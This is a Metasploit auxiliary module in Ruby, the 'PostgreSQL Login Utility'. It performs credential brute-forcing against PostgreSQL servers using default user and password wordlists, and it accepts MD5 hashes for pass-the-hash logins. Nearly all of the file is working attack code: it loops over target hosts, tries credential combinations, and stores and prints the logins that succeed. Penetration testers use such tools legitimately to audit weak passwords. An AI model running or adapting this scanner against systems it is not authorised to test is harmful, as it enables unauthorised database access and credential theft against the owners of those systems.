##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/credential_collection'
require 'metasploit/framework/login_scanner/postgres'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Postgres
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  # Creates an instance of this module.
  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'PostgreSQL Login Utility',
      'Description'    => %q{
        This module attempts to authenticate against a PostgreSQL
        instance using username and password combinations indicated
        by the USER_FILE, PASS_FILE, and USERPASS_FILE options. Note that
        passwords may be either plaintext or MD5 formatted hashes.
      },
      'Author'         => [ 'todb' ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'URL', 'http://www.postgresql.org' ],
          [ 'CVE', '1999-0502'], # Weak password
          [ 'URL', 'https://hashcat.net/forum/archive/index.php?thread-4148.html' ] # Pass the Hash
        ]
    ))

    register_options(
      [
        Opt::Proxies,
        OptPath.new('USERPASS_FILE',  [ false, "File containing (space-separated) users and passwords, one pair per line",
          File.join(Msf::Config.data_directory, "wordlists", "postgres_default_userpass.txt") ]),
        OptPath.new('USER_FILE',      [ false, "File containing users, one per line",
          File.join(Msf::Config.data_directory, "wordlists", "postgres_default_user.txt") ]),
        OptPath.new('PASS_FILE',      [ false, "File containing passwords, one per line",
          File.join(Msf::Config.data_directory, "wordlists", "postgres_default_pass.txt") ]),
      ])

    deregister_options('SQL', 'PASSWORD_SPRAY')

  end

  # Loops through each host in turn. Note the current IP address is both
  # ip and datastore['RHOST']
  def run_host(ip)
    cred_collection = Metasploit::Framework::CredentialCollection.new(
        blank_passwords: datastore['BLANK_PASSWORDS'],
        pass_file: datastore['PASS_FILE'],
        password: datastore['PASSWORD'],
        user_file: datastore['USER_FILE'],
        userpass_file: datastore['USERPASS_FILE'],
        username: datastore['USERNAME'],
        user_as_pass: datastore['USER_AS_PASS'],
        realm: datastore['DATABASE']
    )

    cred_collection = prepend_db_passwords(cred_collection)

    scanner = Metasploit::Framework::LoginScanner::Postgres.new(
      host: ip,
      port: rport,
      proxies: datastore['PROXIES'],
      cred_details: cred_collection,
      stop_on_success: datastore['STOP_ON_SUCCESS'],
      bruteforce_speed: datastore['BRUTEFORCE_SPEED'],
      connection_timeout: 30,
      framework: framework,
      framework_module: self,
    )

    scanner.scan! do |result|
      credential_data = result.to_h
      credential_data.merge!(
          module_fullname: self.fullname,
          workspace_id: myworkspace_id
      )
      if result.success?
        credential_core = create_credential(credential_data)
        credential_data[:core] = credential_core
        create_credential_login(credential_data)

        print_good "#{ip}:#{rport} - Login Successful: #{result.credential}"
      else
        invalidate_login(credential_data)
        vprint_error "#{ip}:#{rport} - LOGIN FAILED: #{result.credential} (#{result.status}: #{result.proof})"
      end
    end

  end

  # Alias for RHOST
  def rhost
    datastore['RHOST']
  end

  # Alias for RPORT
  def rport
    datastore['RPORT']
  end



end
